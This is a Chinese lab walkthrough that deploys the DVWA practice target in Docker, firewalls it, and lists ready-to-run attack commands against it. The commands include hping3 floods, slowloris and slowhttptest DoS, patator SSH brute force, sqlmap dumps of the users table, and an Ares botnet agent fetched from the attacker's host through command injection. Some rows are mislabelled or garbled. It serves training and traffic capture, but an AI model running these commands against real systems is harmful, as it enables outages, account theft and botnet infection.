---
title: "xnwlaqbc靶机部署+攻击全流程"
date: 2026-04-01
draft: false
weight: 1
---

# 一、环境侦测
## 1.1 Linux系统内核信息
```
[root@xnwlaqbc ~]# uname -a
Linux xnwlaqbc 5.10.0-216.0.0.115.oe2203sp4.x86_64 #1 SMP Thu Jun 27 15:13:44 CST 2024 x86_64 x86_64 x86_64 GNU/Linux

[root@xnwlaqbc ~]# hostnamectl
 Static hostname: xnwlaqbc
       Icon name: computer-vm
         Chassis: vm
      Machine ID: 16bd4a31931045a6b7abcfa9100d1164
         Boot ID: 043a5f3240d1408199b437ff1b6d1611
  Virtualization: kvm
Operating System: openEuler 22.03 (LTS-SP4)
          Kernel: Linux 5.10.0-216.0.0.115.oe2203sp4.x86_64
    Architecture: x86-64
 Hardware Vendor: QEMU
  Hardware Model: Standard PC _i440FX + PIIX, 1996_

[root@xnwlaqbc ~]# cat /proc/version
Linux version 5.10.0-216.0.0.115.oe2203sp4.x86_64 (root@dc-64g.compass-ci) (gcc_old (GCC) 10.3.1, GNU ld (GNU Binutils) 2.37) #1 SMP Thu Jun 27 15:13:44 CST 2024
```

## 1.2 docker部署
> 思路：下载`docker`压缩包，下载`dvwa`的docker包，在服务器上部署

```bash
docker pull vulnerables/web-dvwa
docker save -o dvwa_image.tar vulnerables/web-dvwa
```
`https://download.docker.com/linux/static/stable/x86_64/`下载`docker-29.3.1.tgz`

把`docekr-29.3.1.tgz`和`dvwa_imgage.tar`丢进`dvwa`文件夹

```bash
# 解压二进制包
tar -xvf docker-29.3.1.tgz

# 将可执行文件移动到系统路径
cp docker/* /usr/bin/

# 启动 Docker 守护进程（因为是别人的服务器，建议手动后台运行，不写 systemd 也可以）
dockerd &
```

## 1.3 加载dvwa镜像
```BASH
# 加载镜像
docker load -i dvwa_image.tar

# 检查镜像，镜像名为vulnerables/web-dvwa:latest
docker images

# 元神启动！
docker run --name my-dvwa -d -p 8080:80 -it vulnerables/web-dvwa:latest

# 检查容器
docker ps

```

```BASH
[root@xnwlaqbc dvwa]# docker ps
CONTAINER ID   IMAGE                         COMMAND      CREATED         STATUS         PORTS                                     NAMES
cb13b511080a   vulnerables/web-dvwa:latest   "/main.sh"   8 seconds ago   Up 7 seconds   0.0.0.0:8080->80/tcp, [::]:8080->80/tcp   my-dvwa
```

## 1.4 访问靶机
http://靶机ip:8080

## 1.5 限制访问IP

```
[root@xnwlaqbc ~]# who
root     pts/1        2026-03-29 14:31 (172.31.171.155)
root     pts/2        2026-03-29 15:09 (172.31.171.162)

# 启用 firewalld 并设置开机自启
systemctl start firewalld
systemctl enable firewalld

# 允许指定两个IP访问8080端口
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="172.31.171.155" port port="8080" protocol="tcp" accept'
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="172.31.171.162" port port="8080" protocol="tcp" accept'

# 拒绝其他所有IP访问8080端口
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="8080" protocol="tcp" reject'

# 重新加载防火墙规则使其生效
firewall-cmd --reload
查看生效规则：
firewall-cmd --list-all

rich rules:
rule family="ipv4" port port="8080" protocol="tcp" reject
rule family="ipv4" source address="172.31.171.155" port port="8080" protocol="tcp" accept
rule family="ipv4" source address="172.31.171.162" port port="8080" protocol="tcp" accept
```



### 但是遇到docker端口绕过，重新配置：

```
查看容器信息，获取容器内部IP：
    docker ps
    docker inspect cb13b511080a | grep -i ipaddress
得到容器 IP：172.17.0.2
```

```
# 清空原有规则
iptables -F && iptables -X && iptables -Z
iptables -t nat -F && iptables -t nat -X

# 配置NAT端口映射，恢复宿主机8080到容器80的转发
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 172.17.0.2:80
iptables -t nat -A POSTROUTING -s 172.17.0.0/16 -j MASQUERADE

# 配置FORWARD链访问控制规则
iptables -P FORWARD ACCEPT
iptables -A FORWARD -s 172.31.171.155 -d 172.17.0.2 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -s 172.31.171.162 -d 172.17.0.2 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -d 172.17.0.2 -p tcp --dport 80 -j DROP

# 保存规则
service iptables save

#查看
iptables -L FORWARD -n --line-numbers

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination
1    ACCEPT     tcp  --  172.31.171.155       172.17.0.2           tcp dpt:80
2    ACCEPT     tcp  --  172.31.171.162       172.17.0.2           tcp dpt:80
3    DROP       tcp  --  0.0.0.0/0            172.17.0.2           tcp dpt:80
```

# 二、渗透
```zsh
sudo apt update
sudo apt install slowhttptest
sudo apt install slowloris
sudo apt install hulk
sudo apt install ares

tcpdump -i any host 172.31.132.2 and port 8080 # 检查靶机8080端口
tcpdump -i any src 172.31.171.162 -n # 检查自己ip来源的流量
tcpdump -i any port 443 -nn -v # 检查正常curl产生的流量
```
|攻击流量大类|攻击流量小类|工具|OSI层级|具体命令|备注|
|----------|----------|----|-------|-------|-------|
|扫描攻击|操作系统扫描|nmap|网络层/传输层 (L3/L4)|`sudo nmap -O 172.31.132.2`||
|扫描攻击|端口扫描|nmap|传输层 (L4)|`sudo nmap -p- 172.31.132.2`||
|DDoS|UDP Flood/ICMP Flood(海量伪造报文)|hping3|网络层/传输层 (L3/L4)| UDP ddos攻击：`sudo hping3 -c 10000 -d 120 --udp -p 8080 -i u1000 172.31.132.2`<br />ICMP ddos攻击：`sudo hping3 --icmp -c 10000 -i u1000 172.31.132.2`<br /> |`-c 10000`发送总包数；<br />`-d`每个数据包的payload大小；<br />`-w`TCP窗口大小(UDP模式下此参数通常被忽略or特定流量控制)；<br />`-i`发包间隔(几微秒)；<br />`--rand-source`每次发包随机生成一个源IP<br />|
|DoS|HTTP DoS(慢速连接or海量并发请求)|slowhttptest|应用层 (L7)|`sudo slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://172.31.132.2:8080 -x 10 -p 3`|`-c`连接数；<br />`-B`消息正文中慢速；<br />`-g`生成CSV和HTML格式的统计数据；<br />`-o`指定输出的文件名；<br />`-i`每个连接的后续数据间的间隔；<br />`-r`连接率(每秒的连接)；<br />`-s`如果指定了-B，则content-length标头的值；<br />`-t`要使用的自定义动词；<br />`-x`随访数据的最大长度；<br />`-p`等待探针连接上的HTTP响应超时，此后服务器被视为不可访问|
|DoS|HTTP DoS(不完整的HTTP请求不要断开)|slowloris|应用层 (L7)|`sudo slowloris 172.31.132.2 -p 8080 -s 50`|`slowloris`能低速缓慢发送http头部，`-s`是套接字数量，这里设置50，防火墙可以抓到慢速交互的特征|
|DoS|HTTP DoS(大量伪造动态请求)|hulk|应用层 (L7)|[HULK/hulk.py at main · R3DHULK/HULK](https://github.com/R3DHULK/HULK/blob/main/hulk.py)下载hulk.py，再`python hulk.py`指定ip和端口||
|DoS|TCP SYN Flood(TCP三次握手缺陷，大量伪造SYN包)|hping3|传输层 (L4)| `sudo hping3 -S -p 8080 -c 10000 -d 120 -i u1000 172.31.132.2` ||
|暴力破解|FTP 破解|patator|应用层 (L7)|`patator ftp_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt`||
|暴力破解|SSH 破解|patator|应用层 (L7)|`patator ssh_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt`||
|Web 攻击|XSS 攻击|sqlmap|应用层 (L7)|`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=http://172.31.132.2:8080/45kllrq88ifueqivkuco7dmdk0" -D dvwa -T users --dump --batch`|修改cookies|
|Web 攻击|SQL 注入|sqlmap|应用层 (L7)| 检测注入漏洞`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low" --batch`<br />枚举数据库名称`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low" --dbs --batch`<br />查看当前使用的数据库`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low" --current-db --batch`<br />枚举指定数据库下的所有表`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low" -D dvwa --tables --batch`<br />窃取特定表的数据`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low" -D dvwa -T users --dump --batch`<br /> | 修改cookies |
|僵尸网络（由于版本问题未部署成功）|Ares 僵尸网络|ares|应用层 (L7)|1. 克隆ares源代码`git clone https://github.com/sweetsoftware/Ares.git`,解压后进入文件夹`pip install -r requirements.txt`<br />2. 接着kali中`python ares.py server`等待僵尸节点上线<br />3. 靶机上运行agent脚本，指向自己的kaliip`python ares.py agent 192.168.203.129`<br />4. 第三步中，可以利用DVWA的命令注入漏洞`weget http://自己的kali ip:8000/agent.py`，并安装agent所需依赖`pip install requests`|使用虚拟环境安装依赖<br />`sudo conda create -n ares python=3.9`<br />`source activate`<br />|